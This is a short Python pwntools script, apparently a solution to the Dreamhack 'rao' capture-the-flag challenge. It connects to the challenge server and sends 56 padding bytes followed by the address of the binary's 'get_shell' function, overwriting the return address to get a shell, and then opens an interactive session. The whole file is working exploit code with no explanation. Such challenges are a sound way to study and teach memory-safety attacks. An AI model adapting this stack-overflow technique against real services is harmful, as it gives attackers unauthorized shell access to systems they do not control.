from pwn import *
p = remote('host3.dreamhack.games', 10726)
elf = ELF('rao')
payload = b'a' * 56 + p64(elf.symbols['get_shell'])
p.sendline(payload)
p.interactive()
